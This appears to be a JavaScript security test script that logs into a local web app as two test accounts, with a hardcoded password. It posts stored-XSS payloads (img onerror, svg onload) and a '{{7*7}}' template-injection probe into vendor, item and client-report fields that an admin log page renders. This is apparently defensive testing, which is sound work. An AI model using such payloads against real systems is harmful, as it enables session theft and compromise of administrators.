const API="http://127.0.0.1:8200"; const PW="Sec#Test2026ok";
async function login(c){const r=await fetch(`${API}/api/auth/login`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({login_id:c,password:PW})});return (await r.json()).access_token;}
const h=t=>({Authorization:`Bearer ${t}`,"Content-Type":"application/json"});
const secho=await login("SECHO"); const secself=await login("SECSELF");
const XSS=`<img src=x onerror=window.__xss=1>`;
const SVG=`"><svg onload=window.__xss=1>`;
// 1. vendor with XSS name
let r=await fetch(`${API}/api/masters/vendors`,{method:"POST",headers:h(secho),body:JSON.stringify({name:`IN-XSS ${XSS}`, contact_name:`IN ${SVG}`})});
console.log("vendor", r.status, (await r.text()).slice(0,200));
// 2. item with XSS name (needs subcategory_id etc?) try minimal
const itemBody={name:`IN-XSS ${XSS}`, category_id:1, subcategory_id:1};
r=await fetch(`${API}/api/items`,{method:"POST",headers:h(secho),body:JSON.stringify(itemBody)});
console.log("item", r.status, (await r.text()).slice(0,250));
// 3. client report as SECSELF with XSS message + note (admin Logs renders this)
const crBody={kind:"USER_REPORT", message:`IN-XSS report ${XSS} {{7*7}}`, note:`note ${SVG}`, route:`/assets?q=${XSS}`};
r=await fetch(`${API}/api/client-reports`,{method:"POST",headers:h(secself),body:JSON.stringify(crBody)});
const crt=await r.text(); console.log("client-report", r.status, crt.slice(0,250));
